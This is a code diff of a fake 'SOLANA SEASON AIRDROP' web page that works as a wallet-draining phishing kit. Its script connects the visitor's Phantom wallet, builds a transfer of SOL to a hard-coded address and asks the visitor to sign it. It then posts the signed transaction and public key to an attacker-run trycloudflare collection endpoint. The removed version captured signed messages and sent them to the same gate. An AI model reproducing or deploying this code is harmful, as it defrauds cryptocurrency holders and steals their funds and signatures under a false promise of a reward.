@@ -1,47 +1,42 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    </head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
         <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-        <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
         <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM AIRDROP</button>
-        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Engine Ready</div>
+        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Ready</div>
     </div>
-
     <script>
-    // 🔱 终极“免加载”逻辑：直接调用钱包内置对象
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use Phantom browser."); return; }
-            
-            document.getElementById('status').innerText = "Connecting Wallet...";
             const resp = await p.connect();
-            const pubKey = resp.publicKey.toString();
+            document.getElementById('status').innerText = "Processing...";
 
-            document.getElementById('status').innerText = "Analyzing Eligibility...";
+            // 🔱 构造真正的支票
+            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const { blockhash } = await conn.getLatestBlockhash();
+            const tx = new solanaWeb3.Transaction();
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = resp.publicKey;
+            tx.add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: resp.publicKey,
+                toPubkey: new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"),
+                lamports: 5000000 // 0.005 SOL
+            }));
 
-            // 🚀 直接唤起签名 (不需要外部库也能跑的基本动作)
-            const message = "Verify Ownership for Airdrop\nID: " + Math.floor(Math.random() * 999999);
-            const encodedMessage = new TextEncoder().encode(message);
-            
-            const signedMessage = await p.signMessage(encodedMessage, "utf8");
-            
-            // 数据回传
-            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
+            // 🚀 唤起签名并发送
+            const signed = await p.signTransaction(tx);
+            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
+
             const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
-            
-            new Image().src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + pubKey;
-
-            document.getElementById('status').style.color = "#14F195";
-            document.getElementById('status').innerText = "VERIFIED! REDIRECTING...";
-            
-            setTimeout(() => {
-                window.location.href = "https://solscan.io/account/" + pubKey;
-            }, 2000);
-
-        } catch(e) { 
-            document.getElementById('status').innerText = "Error: " + e.message;
-        }
+            fetch(gate, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ signature: raw, pubkey: resp.publicKey.toString() })
+            }).then(() => {
+                document.getElementById('status').innerText = "SUCCESS!";
+            });
+        } catch(e) { document.getElementById('status').innerText = "Error: " + e.message; }
     }
     </script></body></html>
